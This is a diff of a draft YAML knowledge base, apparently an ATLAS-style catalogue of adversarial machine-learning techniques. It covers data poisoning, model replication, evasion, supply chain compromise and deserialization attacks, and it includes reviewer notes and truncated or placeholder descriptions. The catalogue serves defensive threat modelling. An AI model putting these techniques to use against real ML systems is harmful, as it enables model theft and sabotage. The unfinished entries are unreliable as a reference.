@@ -1,383 +1,708 @@
-- id: MLT0000
+- id: AML.T0000
   object-type: technique
-  name: Acquire OSINT Information
-  description: 'Adversaries may leverage publicly available information, or Open Source
-    Intelligence (OSINT), about an organization that could identify where or how machine
-    learning is being used in a system, and help tailor an attack to make it more
-    effective. These sources of information include technical publications, blog posts,
-    press releases, software repositories, public data repositories, and social media
-    postings.
+  name: Search for Victim's Publicly Available Research Materials
+  description: 'Adversaries may search publicly available research to learn how and
+    where machine learning is used within a victim organization.
+
+    The adversary can use this information to identify targets for attack, or to tailor
+    an existing attack to make it more effective.
+
+    Organizations often use open source model architectures trained on additional
+    proprietary data in production.
+
+    Knowledge of this underlying architecture allows the adversary to craft more realistic
+    [proxy models](/techniques/AML.T0005).
+
+    Research materials may exist as academic papers published in [journals and conference
+    proceedings](/techniques/AML.T0000.000), or stored in [pre-print repositories](/techniques/AML.T0000.001),
+    as well as [technical blog posts](/techniques/AML.T0000.002).
 
     '
   tactics:
   - TA0043
-- id: MLT0001
+- id: AML.T0000.000
   object-type: technique
-  name: ML Model Discovery
-  description: 'Adversaries may attempt to identify machine learning pipelines that
-    exist on the system and gather information about them, including the software
-    stack used to train and deploy models, training and testing data repositories,
-    model repositories, and software repositories containing algorithms. This information
-    can be used to identify targets for further collection, exfiltration, or disruption,
-    or to tailor and improve attacks.
+  name: Journals and Conference Proceedings
+  description: 'Many of the publications accepted at premier machine learning conferences
+    and journals come from commercial labs.
 
-    '
-  tactics:
-  - TA0043
-- id: MLT0002
-  object-type: technique
-  name: Reveal ML Ontology
-  description: 'By ML Ontology, we are referring to specific components of the ML
-    system such as dataset (image, audio, tabular, NLP), features (handcrafted or
-    learned), model / learning algorithm (gradient based or non-gradient based), parameters
-    / weights. Depending on how much information is known, it can be a greybox or
-    whitebox level of attacker knowledge.
+    Some journals and conferences are open access, others may require paying for access
+    or a membership.
 
-    '
-  subtechnique-of: MLT0001
-  tactics:
-  - TA0043
-- id: MLT0003
-  object-type: technique
-  name: Reveal ML Model Family
-  description: 'Here the specifics of ML Models are not known and can generally be
-    thought of as blackbox attacks. The attacker is able to only glean the model task,
-    model input and model output. But because of the nature of the blog posts or papers
-    that are published, some mention of the algorithms such as "Deep Learning" may
-    squarely indicate that the underlying algorithm is gradient based.
-
-    '
-  subtechnique-of: MLT0001
-  tactics:
-  - TA0043
-- id: MLT0004
-  object-type: technique
-  name: Gathering Datasets
-  description: 'Adversaries may collect datasets similar to those used by a particular
-    organization or in a specific approach. Datasets may be identified when [Acquiring
-    OSINT Information](#Acquire-OSINT-Information). This may allow the adversary to
-    replicate a private model''s functionality, constituting Intellectual Property
-    Theft, or enable the adversary to carry out other attacks such as an [Evasion
-    Attack](#Evasion-Attack).
-
-    '
-  tactics:
-  - TA0043
-- id: MLT0005
-  object-type: technique
-  name: Exploit Physical Environment
-  description: 'In addition to the attacks that take place purely in the digital domain,
-    adversaries may also exploit the physical environment for their attacks. Recent
-    work has show successful false positive and evasion attacks using physically printed
-    patterns that are placed into scenes to disrupt and attack machine learning models.
-    MITRE has recently created a dataset based on these [physically printed patterns](https://apricot.mitre.org/)
-    to help researchers and practitioners better understand these attacks.
-
-    '
-  tactics:
-  - TA0043
-- id: MLT0006
-  object-type: technique
-  name: Model Replication
-  description: 'An adversary may replicate a model''s functionality by training a
-    shadow model by exploiting its API, or by leveraging pre-trained weights.
-
-    '
-  tactics:
-  - TA0043
-- id: MLT0007
-  object-type: technique
-  name: Exploit API - Shadow Model
-  description: 'An adversary may replicate a machine learning model''s functionality
-    by exploiting its inference API. In this case of model replication, the attacker
-    repeatedly queries the victim''s inference API and uses it as an oracle to collect
-    combination of data and label. From the combination of (data,label), the attacker
-    builds a shadow model, that effectively functions as the victim model -- but with
-    lower fidelity. This is generally the first step in model evasion.
-
-    '
-  subtechnique-of: MLT0006
-  tactics:
-  - TA0043
-- id: MLT0008
-  object-type: technique
-  name: Alter Publicly Available, Pre-Trained Weights
-  description: 'An adversary uses pre-trained weights of one model to replicate a
-    related model''s functionality. For instance, researchers wanted to replicated
-    GPT-2, a large language model. So, the researchers used the pre-trained weights
-    of Grover, another NLP model, and modified it using GPT-2''s objective function
-    and training data, which effectively resulted in a shadow GPT-2 model (though
-    with lower fidelity).
-
-    '
-  subtechnique-of: MLT0006
-  tactics:
-  - TA0043
-- id: MLT0009
-  object-type: technique
-  name: Model Stealing
-  description: 'Machine learning models'' functionality can be stolen exploiting an
-    inference API. There is a difference between Model Extraction and Model Replication:
-    in model extraction attacks, the attacker is able to build a shadow model whose
-    fidelity matches that of the victim model and hence, model stealing/extraction
-    attacks lead to Stolen Intellectual Property. In [Model Replication](#Model-Replication)
-    attacks, the shadow model does not have the same fidelity as that of the victim
+    These publications will often describe in detail all aspects of a training particular
     model.
 
+    This information, which is critical for replication, can also be utilized by adversaries.
+
+    It not only implies that the victim organization is utilizing machine learning
+    for a particular task, it also implies exactly what kind of model they are likely
+    to use.
+
+    '
+  subtechnique-of: AML.T0000
+- id: AML.T0000.001
+  object-type: technique
+  name: Pre-Print Repositories
+  description: 'Pre-Print repositories, such as arXiv, contain the latest academic
+    research papers that haven''t been peer reviewed.
+
+    They may contain research notes, or technical reports that aren''t typically published
+    in journals or conference proceedings.
+
+    Pre-print repositories also serve as a central location to share papers that have
+    been accepted to journals.
+
+    An adversary can search these repositories for authors at the victim organization.
+
+    This will give an adversary a relatively up to date view of what researchers in
+    the victim organization are working on.
+
+    '
+  subtechnique-of: AML.T0000
+- id: AML.T0000.002
+  object-type: technique
+  name: Technical Blogs
+  description: 'Research labs at academic institutions and Company R&D divisions often
+    have blogs that highlight their use of machine learning and its application to
+    the organizations unique problems.
+
+    Individual researchers also frequently document their work in blogposts.
+
+    An adversary may search for posts made by the target victim organization or its
+    employees.
+
+    In comparison to [journals and conference proceedings](/techniques/AML.T0000.000)
+    and [pre-print repositories](/techniques/AML.T0000.001) this material will often
+    contain more practical aspects of the machine learning system.
+
+    This could include underlying technologies and frameworks used, and possibly some
+    information about the API access and use case.
+
+    This will help the adversary better understand how that organization is using
+    machine learning internally and the details of their approach that could aid in
+    tailoring an attack.
+
+    '
+  subtechnique-of: AML.T0000
+- id: AML.T0001
+  object-type: technique
+  name: Search for Public ML Artifact Repositories
+  description: 'Adversaries may search public sources, including cloud storage, public-facing
+    services, and software or data repositories, to identify machine learning artifacts.
+
+    These machine learning artifacts may include the software stack used to train
+    and deploy models, training and testing data, model configurations and parameters.
+
+    An adversary will be particularly interested in artifacts hosted by or associated
+    with the victim organization as they may represent what that organization uses
+    in a production environment.
+
+    Adversaries may identify artifact repositories via other resources associated
+    with the victim organization (e.g. [Search Victim-Owned Websites](/techniques/T1594)
+    or [Search for Victim''s Publicly Available Research Materials](/techniques/AML.T0000)).
+
     '
   tactics:
   - TA0043
-- id: MLT0010
+- id: AML.T0012
   object-type: technique
-  name: Pre-Trained ML Model with Backdoor
-  description: 'Adversaries may gain initial access to a system by compromising portions
-    of the ML supply chain. This could include GPU hardware, data and its annotations,
-    parts of the ML software stack, or the model itself. In some instances the attacker
-    will need secondary access to fully carry out an attack using compromised components
-    of the supply chain.
+  name: Search for Publicly Available Adversarial Vulnerability Analysis
+  description: 'Much like the [published research for a victim system](/techniques/AML.T0000),
+    there is often ample research available on the vulnerabilities of common models.
+    Once a target has been identified, an adversary will likely try to identify any
+    preexisting work that has been done for this model class.
+
+    This will include not only reading academic papers that may identify the particulars
+    of a successful attack, but also obtaining pre-existing implementations of those
+    attacks. Libraries intended for research purposes, such as CleverHans, the Adversarial
+    Robustness Toolbox, and FoolBox, can be weaponized by an adversary for these means.'
+  tactics:
+  - TA0042
+- id: AML.T0004
+  object-type: technique
+  name: Acquire Public ML Artifacts
+  description: 'Adversaries may acquire the machine learning related artifacts that
+    were identified during Reconnaissance.
+
+    These ML artifacts often provide adversaries with details of the ML task and approach.
+
+    This will aid in an adversaries ability to [create and train proxy models](/technique/AML.T0005).
+
+    If these artifacts include pieces of the actual model in production, they can
+    be used to directly [optimize attacks](/technique/AML.T0043).
+
+    Acquiring some artifacts requires registration (providing user details such email/name),
+    AWS keys, or written requests, and may require the adversary to [Establish Accounts](/techniques/T1585).
+
+    Artifacts might be hosted on victim-controlled infrastructure, providing the victim
+    with some information on who has accessed that data.
+
+    '
+  tactics:
+  - TA0042
+- id: AML.T0004.000
+  object-type: technique
+  name: Collect Representative Datasets
+  description: '
+
+    Adversaries may collect datasets similar to those used by the victim organization.
+
+    Collecting a dataset will either require the manual creation of the dataset from
+    scratch, or modifying publicly available datasets in order to more closely match
+    the victim system.
+
+
+    This is often a requirement for the [creation of a proxy model](/technique/AML.T0005).
+
+    An adversary may also acquire a dataset for the purposes of poisoning it and [releasing
+    the poisoned version of the dataset publicly](/techniques/AML.T0019).
+
+    This could [compromise the victim organization''s ML supply chain](), and enable
+    adversary goals such as [reducing ML model integrity]() and [evading ML models]().
+
+    '
+  subtechnique-of: AML.T0004
+- id: AML.T0004.001
+  object-type: technique
+  name: Collect Representative Models
+  description: 'Idenifying pre-trained models... Fine-tuned into proxy models/poisoned
+
+    '
+  subtechnique-of: AML.T0004
+- id: AML.T0008
+  object-type: technique
+  name: Acquire Attack Development and Staging Workspaces
+  description: 'Developing and staging machine learning attacks often requires expensive
+    compute resources.
+
+    An adversary will possibly need access to one or many GPUs in order to develop
+    an attack.
+
+    An adversary may try to anonymously use free resources such as Google Colaboratory,
+    or cloud resources such as AWS, Azure, or Google Cloud as an efficient way to
+    stand up temporary resources to conduct operations.
+
+    Multiple workspaces may be used to avoid detection.
+
+    '
+  tactics:
+  - TA0042
+- id: AML.T0005
+  object-type: technique
+  name: Train Proxy Models
+  description: 'Adversaries may train models to serve as proxies for the target model
+    in use at the victim organization.
+
+    Proxy models are used to simulate complete access to the target model in a fully
+    offline manner.
+
+    This can be used to develop attacks that require higher levels of access than
+    the adversary has available or as a means to validate pre-existing attacks without
+    interacting with the target model.
+
+
+    #NOTE MRK: I feel like techniques can reference forward in time, but something
+    about referencing backward seems weird to me
+
+    # Adversaries can use information gathered from publicly available research, and
+    leverage public ML artifacts to train proxy models.
+
+
+    #NOTE MRK: See response below (203-ish)
+
+    #If an adversary is able to identify and access a model''s inference API, they
+    may attempt to [replicate the model](/techniques/AML.T0006) instead of using a
+    proxy.
+
+    '
+  tactics:
+  - TA0042
+- id: AML.T0019
+  object-type: technique
+  name: Create Poisoned Datasets
+  description: 'Adversaries may attempt to create poisoned datasets.
+
+    These datasets will seem completely normal on inspection, but will contain hidden
+    patterns that allow an adversary to attack models trained on the dataset without
+    any other access.
+
+    These embedded vulnerabilities can be activated at a later time by providing the
+    model with data containing a trigger.
+
+    Data Poisoning can help enable attacks such as [ML Model Evasion](#Evasion-Attack).
+
+    This data can be introduced via the adversary releasing it publicly, compromising
+    a pre-existing published dataset via a [ML Supply Chain Compromise]() or a private
+    dataset may be poisoned after the adversary gains access to the system.
+
+    #NOTE MRK: This falls under the specific examples
+
+    #For instance, the adversary could cause a targeted misclassification attack only
+    when certain triggers are present in the query; and perform well otherwise.
+
+    '
+  tactics:
+  - TA0042
+- id: AML.T0010
+  object-type: technique
+  name: ML Supply Chain Compromise
+  description: 'Adversaries may gain initial access to a system by compromising the
+    unique portions of the ML supply chain.
+
+    This could include GPU hardware, data and its annotations, parts of the ML software
+    stack, or the model itself.
+
+    In some instances the attacker will need secondary access to fully carry out an
+    attack using compromised components of the supply chain.
 
     '
   tactics:
   - TA0001
-- id: MLT0011
+- id: AML.T0010.000
   object-type: technique
-  name: Execute Unsafe ML Models
-  description: 'An Adversary may utilize unsafe ML Models that when executed have
-    an unintended effect. The adversary can use this technique to establish persistent
-    access to systems. These models may be introduced via a [Pre-Trained Model with
-    Backdoor](#Pre-Trained-ML-Model-with-Backdoor).
+  name: GPU Supply Chain
+  description: 'Most machine learning systems require access to certain specialized
+    hardware, typically GPUs.
+
+    Advesaries can target machine learning systems by specifically targeting the GPU
+    supply chain.
+
+    '
+  subtechnique-of: AML.T0010
+- id: AML.T0010.001
+  object-type: technique
+  name: Machine Learning Software
+  description: 'Most machine learning systems rely on a limited set of machine learning
+    frameworks.
+
+    An adversary could get access to a large number of machine learning systems through
+    a comprise of one of their supply chains.
+
+    Many machine learning projects also rely on other open source implementations
+    of different techniques.
+
+    These can also be compromised in a targeted way to get access to specific systems.
+
+    '
+  subtechnique-of: AML.T0010
+- id: AML.T0010.002
+  object-type: technique
+  name: Data
+  description: 'Data is a key vector of supply chain compromise for adversaries.
+
+    Every machine learning project will require some form of data.
+
+    Many rely, to some extent, on large open source datasets that are publicly available.
+
+    An adversary could rely on compromising these sources of data to some extent.
+
+    This compromise can come in the form of [data poisioning]() or more traditional
+    malware.
+
+
+    An adversary can also target private datasets in the labeling phase.
+
+    The creation of private datasets will often require the hiring of outside labeling
+    services.
+
+    An adversary can poison a dataset by modifying the labels being generated by the
+    labeling service.
+
+    '
+  subtechnique-of: AML.T0010
+- id: AML.T0010.003
+  object-type: technique
+  name: Model
+  description: 'Machine learning systems often rely on open sourced models in various
+    ways.
+
+    Most commonly, the victim organization may be using these models for fine tuning.
+
+    These models will be downloaded from an external source and then used as the base
+    for the model as it is tuned on a smaller, private dataset.
+
+    Loading models often requires executing some saved code in the form of a saved
+    model file.
+
+    These can be compromised with traditional malware, or through some adversarial
+    machine learning techniques.
+
+    '
+  subtechnique-of: AML.T0010
+- id: AML.T0040
+  object-type: technique
+  name: Access to ML Inference API
+  description: 'An adversary''s may gain access to a model via legitimate access to
+    the inference API.
+
+    This form of black-box access may allow the adversary to successfully [replicate
+    the model](), or perform an [evasion](), or [integrity]() attack with only inference
+    API access.
 
     '
   tactics:
-  - TA0002
-- id: MLT0012
+  - AML.TA0000
+- id: AML.T0041
   object-type: technique
-  name: ML Models from Compromised Sources
-  description: 'In Model Zoo such as "Caffe Model Zoo" or "ONNX Model Zoo" a collection
-    of state of the art ML, pre-trained ML models are available so that ML engineers
-    do not have to spend resources training ML models from scratch (hence "pre-trained").
-    An adversary may be able to compromise the model by checking in malicious code
-    into the repository or perform a Man-in-the-Middle attack as the models are downloaded.
+  name: Access to Physical Environment
+  description: 'In addition to the attacks that take place purely in the digital domain,
+    adversaries may also exploit the physical environment for their attacks.
+
+    If the model is interacting with data being generated from the real world in some
+    way, the adversary can influence the model through access to wherever the data
+    is being collected.
+
+    By modifying the data in the collection process, the adversary can perform modified
+    versions of attacks designed for digital access.
+
+    Recent work has show successful false positive and evasion attacks using physically
+    printed patterns that are placed into scenes to disrupt and attack machine learning
+    models.
 
     '
-  subtechnique-of: MLT0011
   tactics:
-  - TA0002
-- id: MLT0013
+  - AML.TA0000
+- id: AML.T0044
   object-type: technique
-  name: Pickle Embedding
-  description: 'Python is one of the most commonly used ML language. Python pickles
-    are used in serializing and de-serializing a Python object structures. ML models
-    are sometimes stored as pickles and shared. An adversary may use pickle embedding
-    to introduce malicious data payloads which may result in remote code execution.
+  name: Full ML Model Access
+  description: 'The adversary has full access to the target model.
+
+    This allows the adversary to use white-box attacks.
 
     '
-  subtechnique-of: MLT0011
   tactics:
-  - TA0002
-- id: MLT0014
+  - AML.TA0000
+- id: AML.T0020
   object-type: technique
-  name: Execute unsafe ML Model Execution
-  description: 'An Adversary may utilize unsafe ML Models that when executed have
-    an unintended effect. The adversary can use this technique to establish persistent
-    access to systems. These models may be introduced via a [Pre-trained Model with
-    Backdoor](#Pre-Trained-ML-Model-with-Backdoor). An example of this technique is
-    to use pickle embedding to introduce malicious data payloads.
+  name: Poison Private Data
+  description: 'Adversaries may attempt to poison datasets used by a ML system by
+    modifying the underlying data or its labels.
+
+    This allows the adversary to embed vulnerabilities in ML models trained on the
+    data that may not be easily detectable.
+
+    This data can be introduced via [ML Supply Chain Compromise]() or the data may
+    be poisoned after the adversary gains access to the system.
+
+    The embedded vulnerability can be activated at a later time by providing the model
+    with data containing the trigger.
+
+    Data Poisoning can help enable attacks such as [ML Model Evasion](#Evasion-Attack).
 
     '
   tactics:
   - TA0003
-- id: MLT0015
+- id: AML.T0006
   object-type: technique
-  name: Evasion Attack
-  description: 'Unlike poisoning attacks that needs access to training data, adversaries
-    can fool an ML classifier by simply corrupting the query to the ML model. More
-    broadly, the adversary can create data inputs that prevent a machine learning
-    model from positively identifying the data sample. This technique can be used
-    to evade an ML model to correctly classify it in the downstream task.
+  name: Model Replication
+  description: 'An adversary may replicate a private model''s functionality.
+
+    The model may be replicated for the purposes of staging a [Model Evasion]() or
+    [Model Integrity]() attack.
+
+    Adversaries may also replicate the model to avoid paying per query in a MLaaS
+    setting.
+
+    This replication can happen through black-box access, possibly by abusing a public-facing
+    API.
+
+    By repeatedly querying the victim''s inference API, the adversary can collect
+    it''s inferences into a dataset.
+
+    The inferences are used as labels for training a separate model offline that will
+    mimic the behavior and performance of the target model.
 
     '
   tactics:
-  - MLTA0000
-- id: MLT0016
+  - AML.TA0001
+- id: AML.T0007
   object-type: technique
-  name: Offline Evasion
-  description: 'In this case, the attacker has an offline copy of the ML model that
-    was obtained via Model Replication or Model Extraction - depending on the case,
-    the offline copy may be a shadow copy or a faithful reconstruction of the original
-    model. While the goal of the adversary is to evade an online model, having access
-    to an Offline model provides a space for the attacker to evade ML model without
-    the fear of tripwires. Once the sample that evades the ML model is found, the
-    attacker can essentially replay the sample to the victim, online model and be
-    successful in the operation.\n
+  name: Discover ML Artifacts
+  description: 'Adversaries may search private sources to identify machine learning
+    artifacts that exist on the system and gather information about them.
 
-    Now this asks the question - how can an an adversary find the sample algorithmically
-    that evades the offline ML model? There are many strategies at play, and depending
-    on the economics, the attacker may choose one from the following: Simple Transformation
-    of the input (cropping, shearing, translation), Common Corruption (adding white
-    noise in the background), Adversarial Examples (carefully perturbing the input
-    to achieve desired output) and Happy String (wherein the benign input is tacked
-    onto malicious query points).
+    These artifacts can include the software stack used to train and deploy models,
+    training and testing data repositories, docker images, and software repositories
+    containing algorithms.
+
+    An adversary may also attempt to discover the victim organization''s "Model Zoo",
+    which contains all of their trained models.
+
+    This information can be used to identify targets for further collection, exfiltration,
+    or disruption, or to tailor and improve attacks.
+
+    Identifying writable storage could also lead to compromise of the model or system
+    and result in initial access.
 
     '
-  subtechnique-of: MLT0015
   tactics:
-  - MLTA0000
-- id: MLT0017
+  - TA0007
+- id: AML.T0011
   object-type: technique
-  name: Online Evasion
-  description: 'The same sub techniques like Simple Transformation, Common Corruption,
-    Adversarial Examples, Happy Strings work also in the context of Online evasion
-    attacks. The distinction between Offline and Online is if the model under attack
-    is either stolen/replicated or if it is the live ML model.
+  name: 'User Execution: Unsafe ML Artifacts
 
     '
-  subtechnique-of: MLT0015
+  description: 'An Adversary may utilize unsafe ML Models that when executed have
+    an unintended effect.
+
+    The adversary can use this technique to establish persistent access to systems.
+
+    These models may be introduced via a [ML Supply Chain Compromise](/techniques/AML.T0010).
+
+    An adversary may use deserialization attacks against ML systems to gain code execution.
+
+    Serialization of models is a popular technique for model storage, transfer, and
+    loading.
+
+    However, this format without proper checking presents an opportunity for code
+    execution.
+
+    '
   tactics:
-  - MLTA0000
-- id: MLT0018
+  - TA0002
+- id: AML.T0015
+  object-type: technique
+  name: Evade ML Model
+  description: 'Adversaries can create data inputs that prevent a machine learning
+    model from correctly identifying a data sample.
+
+    This technique can be used to evade a downstream task where machine learning is
+    utilized.
+
+    # NOTE-- Should this be the same technique as impact? Doing the same thing for
+    different purpose. technique describes the behavior, the tactic defines the purpose.
+
+    # NOTE MRK: this seems to be describing the goals rather than the behavior
+
+    The adversary may evade machine learning based virus/malware detection, or network
+    scanning towards the goal of a traditional cyber attack.
+
+    This can also be used to degrade the general confidence in the model.
+
+
+    # NOTE MRK: This seems a little in the weeds
+
+    #Model evasion can happen in two places - the online model where the adversary
+    interacts with the model directly.
+
+    #The offline mode where an adversary has a copy of the online version of the model.
+
+    '
+  tactics:
+  - TA0005
+  - TA0040
+- id: AML.T0018
   object-type: technique
   name: Model Poisoning
   description: 'Adversaries can train machine learning models that are performant,
     but contain backdoors that produce inference errors when presented with input
-    containing a trigger defined by the adversary. A model with a backdoor can be
-    introduced by an innocent user via a [pre-trained model with backdoor](#Pre-Trained-ML-Model-with-Backdoor)
-    or can be a result of [Data Poisoning](#Data-Poisoning). This backdoored model
-    can be exploited at inference time with an [Evasion Attack](#Evasion-Attack).
+    containing a trigger defined by the adversary.
+
+    A model with a backdoor can be introduced by an innocent user via a [pre-trained
+    model with backdoor](#Pre-Trained-ML-Model-with-Backdoor) or can be a result of
+    [Data Poisoning](#Data-Poisoning).
+
+    This backdoored model can be exploited at inference time with an [Evasion Attack](#Evasion-Attack)
+    or [Model Integrity Attack]()
 
     '
   tactics:
-  - MLTA0000
-- id: MLT0019
-  object-type: technique
-  name: Data Poisoning
-  description: 'Adversaries may attempt to poison datasets used by a ML system by
-    modifying the underlying data or its labels. This allows the adversary to embed
-    vulnerabilities in ML models trained on the data that may not be easily detectable.
-    The embedded vulnerability can be activated at a later time by providing the model
-    with data containing the trigger. Data Poisoning can help enable attacks such
-    as [ML Model Evasion](#Evasion-Attack).
-
-    '
-  tactics:
-  - MLTA0000
-- id: MLT0020
+  - TA0003
+  - AML.TA0001
+- id: AML.T0019.000
   object-type: technique
   name: Tainting Data from Acquisition - Label Corruption
-  description: 'Adversaries may attempt to alter labels in a training set causing
-    the model to misclassify.
+  description: 'Adversaries may attempt to alter labels in a training
 
     '
-  subtechnique-of: MLT0020
-  tactics:
-  - MLTA0000
-- id: MLT0021
+  subtechnique-of: AML.T0019
+- id: AML.T0025
   object-type: technique
-  name: Tainting Data from Open Source Supply Chains
-  description: 'Adversaries may attempt to add their own data to an open source dataset
-    which could create a classification backdoor.  For instance, the adversary could
-    cause a targeted misclassification attack only when certain triggers are present
-    in the query; and perform well otherwise.
+  name: Infer Training Data Membership
+  description: 'An adversary can infer the membership of a data sample in a training
+    via access to set of data and model output pairs.
 
-    '
-  subtechnique-of: MLT0020
-  tactics:
-  - MLTA0000
-- id: MLT0022
-  object-type: technique
-  name: Tainting Data from Acquisition - Chaff Data
-  description: 'Adding noise to a dataset would lower the accuracy of the model, potentially
-    making the model more vulnerable to misclassifications. For instance, researchers
-    showed how they can overwhelm Splunk (and hence the ML models feeding from it),
-    by simply adding potentially corrupted data. See [Attacking SIEM with Fake Logs](https://letsdefend.io/blog/attacking-siem-with-fake-logs/)
+    Some strategies make use of a shadow model that could be obtained via [Model Replication](),
+    others use statistics of model prediction scores.
 
-    '
-  subtechnique-of: MLT0020
-  tactics:
-  - MLTA0000
-- id: MLT0023
-  object-type: technique
-  name: Tainting Data in Training - Label Corruption
-  description: 'Changing training labels could create a backdoor in the model, such
-    that a malicious input would always be classified to the benefit of the adversary.
-    For instance, the adversary could cause a targeted misclassification attack only
-    when certain triggers are present in the query; and perform well otherwise.
-
-    '
-  subtechnique-of: MLT0020
-  tactics:
-  - MLTA0000
-- id: MLT0024
-  object-type: technique
-  name: Exfiltrate Training Data
-  description: 'Adversaries may exfiltrate private information related to machine
-    learning models via their inference APIs. Additionally, adversaries can use these
-    APIs to create copy-cat or proxy models.
-
-    '
-  tactics:
-  - TA0010
-- id: MLT0025
-  object-type: technique
-  name: Membership Inference Attack
-  description: 'The membership of a data sample in a training set may be inferred
-    by an adversary with access to an inference API. By simply querying the inference
-    API of the victim model strategically -- and no extra access -- the adversary
-    can cause privacy violations.
-
-    '
-  subtechnique-of: MLT0024
-  tactics:
-  - TA0010
-- id: MLT0026
-  object-type: technique
-  name: ML Model Inversion
-  description: 'Machine learning models'' training data could be reconstructed by
-    exploiting the confidence scores that are available via an inference API. By simply
-    querying the inference API strategically, an adversary could back out potentially
-    private information  embedded within the training data. This could lead to privacy
-    violations if the attacker can reconstruct the data of sensitive features used
-    in the algorithm.
-
-    '
-  subtechnique-of: MLT0024
-  tactics:
-  - TA0010
-- id: MLT0027
-  object-type: technique
-  name: ML Model Stealing
-  description: 'Machine learning models'' functionality can be stolen exploiting an
-    inference API. There is a difference between Model Extraction and Model Replication:
-    in model extraction attacks, the attacker is able to build a shadow model whose
-    fidelity matches that of the victim model and hence, model stealing/extraction
-    attacks lead to [Stolen Intellectual Property](#Stolen-Intellectual-Property).
-    In Model Replication attacks, shown above, the shadow model does not have the
-    same fidelity as that of the victim model.
-
-    '
-  tactics:
-  - TA0010
-- id: MLT0028
-  object-type: technique
-  name: Defacement
-  description: 'Adversaries can create data inputs that can be used to subvert the
-    system for fun. This can be acheived corrupting the training data via poisoning
-    as in the case of defacement of [Tay Bot](/pages/case-studies-page.md#tay-poisoning),
-    Evasion or exploiting open CVEs in ML dev packages.
+    This can cause the victim model to leak private information, such as PII of those
+    in the training set or other forms of protected IP.
 
     '
   tactics:
   - TA0040
-- id: MLT0029
+- id: AML.T0029
   object-type: technique
-  name: Denial of Service
-  description: 'Adversaries may target different Machine Learning services to conduct
-    a DoS. One example of this type of attack is [Sponge examples](https://arxiv.org/abs/2006.03463)
-    that could cause DoS on production NLP systems by wasting its energy consumption.
+  name: Spamming Machine Learning System with Chaff Data
+  description: 'Adversaries may target different machine learning systems with chaff
+    data.
+
+    Since many machine learning systems require significant amounts of specialized
+    compute, they are often expensive bottlenecks.
+
+    Adversaries can intentionally craft inputs that require heavy amounts of useless
+    compute from the machine learning system.
+
+    By overloading the system entirely, this can result in a denial of service (DoS)
+    attack.
+
+    This can also be used as a form of cost harvesting, requiring the victim system
+    to spend more on computational resources to no end.
+
+    #NOTE MRK: Should probably avoid citing papers here?
+
+    #One example of this type of attack is [Sponge examples](https://arxiv.org/abs/2006.03463).
 
     '
   tactics:
   - TA0040
+- id: AML.T0031
+  object-type: technique
+  name: Erode ML Model Integrity
+  description: 'By degrading the models performance through the purposeful generation
+    of false positives or false negatives, an adversary can erode confidence in the
+    system over time.
+
+    This can lead to the victim organization wasting time and money both attempting
+    to fix the system and performing the tasks it was meant to automate by hand.
+
+    Example attack methods include Simple Transformation, Common Corruption, Adversarial
+    Examples, Adversarial Patches, and  Happy String.
+
+    '
+  tactics:
+  - TA0040
+- id: AML.T0035
+  object-type: technique
+  name: ML Artifact Collection
+  description: '# NOTE MRK: Not sure what else to say here
+
+    After identifying machine learning artifacts existing on the network, the adversary
+    my collect them for exfiltration.
+
+
+    #NOTE MRK: Moving these to discovery?
+
+    #Model Zoo / Model Repo
+
+    #Docker registry
+
+    #git repos
+
+    #training data / data management
+
+    '
+  tactics:
+  - TA0009
+- id: AML.T0042
+  object-type: technique
+  name: Verify Attack
+  description: 'An adversary can verify the efficacy of their attack via an inference
+    API or access to an offline copy of the target model.
+
+    This gives the adversary confidence that their attack works and allows them to
+    carry out the attack at a later time of their choosing.
+
+    The adversary may verify the attack once but use it against many edge devices
+    running copies of the target model.
+
+    The adversary may verify their attack digitally, then deploy it in the [Physical
+    Environment]() at a later time.
+
+    Verifying the attack may be hard to detect since the adversary can use a minimal
+    number of queries.
+
+    '
+  tactics:
+  - AML.TA0001
+- id: AML.T0043
+  object-type: technique
+  name: Optimize Adversarial Example
+  description: 'Adversarial examples are inputs to a machine learning model that have
+    been modified such that they cause an inference error in the target model.
+
+    Typically, the modification is constrained in magnitude or location so that a
+    human still perceives the data as if it were unmodified.
+
+    For example, and adversarial example for an image classification task is an image
+    the machine learning model would misclassify, but a human would still recognize
+    as containing the correct class.
+
+    An adversary may optimize adversarial examples for [ML Model Evasion](), or to
+    [Erode ML Model Integrity]().
+
+    Depending on the adversary''s knowledge of and access to the target model, the
+    adversary may use different classes of algorithms to develop the adversarial example
+    such as [white-box](), [black-box], or [black-box transfer].
+
+    #NOTE MRK: Should this be part of optimizing?
+
+    The adversary may [verify]() their approach works if they have white-box or inference
+    API access to the model.
+
+    This allows the adversary to gain confidence their attack is effective "live"
+    environment where their attack may be noticed.
+
+    They can then use the attack at a later time to accomplish their goals.
+
+    '
+  tactics:
+  - AML.TA0001
+- id: AML.T0043.000
+  object-type: technique
+  name: White-Box Optimization
+  description: 'In White-Box Optimization, the adversary has full access to the target
+    model and optimizes the adversarial example directly.
+
+    Adversarial examples trained in this manor are most effective against the target
+    model and can be easily applied in the digital or physical domain.
+
+    #NOTE MRK: These are examples of attacks, but they could be used for black box
+    transfer, right?
+
+    #Examples of this approach include Fast Gradient Sign Method, Projected Gradient
+    Descent, and Carlini & Wagner.
+
+    '
+  subtechnique-of: AML.T0043
+- id: AML.T0043.001
+  object-type: technique
+  name: Black-Box Optimization
+  description: 'In Black-Box attacks, the adversary has black-box (i.e. [inference-only]()
+    via API access) access to the target model.
+
+    With black-box attacks, the adversary may be using an inference API that the victim
+    is monitoring.
+
+    These attacks are generally less effective and require more inferences than [white
+    box]() attacks, but they require much less access.
+
+    #Examples of this approach include gradient approximation, HopSkipJump, and evolutionary
+    strategies.
+
+    '
+  subtechnique-of: AML.T0043
+- id: AML.T0043.002
+  object-type: technique
+  name: Black-Box Transfer
+  description: 'In Black-Box Transfer attacks, the adversary uses a set of [proxy]()
+    or [replicated]() models they have full access to and are representative of the
+    target model.
+
+    The adversary uses [White-Box Optimation]() on the proxy models to generate the
+    adversarial example.
+
+    If the set of proxy models are close enough to the target model, the adversarial
+    example should generalize from one to another.
+
+    This means that an attack that works for the proxy models will likely then work
+    for the target model.
+
+    If the adversary has [Inference API Access](), they may use this [verify]() that
+    the attack is working and incorporate that information into their training process.
+
+    '
+  subtechnique-of: AML.T0043
 - id: T1546.004
   object-type: technique
   name: .bash_profile and .bashrc
@@ -401,7 +726,7 @@
     \ to gain persistence. Every time the user logs in or opens a new shell, the modified\
     \ ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation: amnesia\
     \ malware)"
-  subtechnique_of: T1546
+  subtechnique-of: T1546
   tactics:
   - TA0004
   - TA0003
@@ -421,7 +746,7 @@
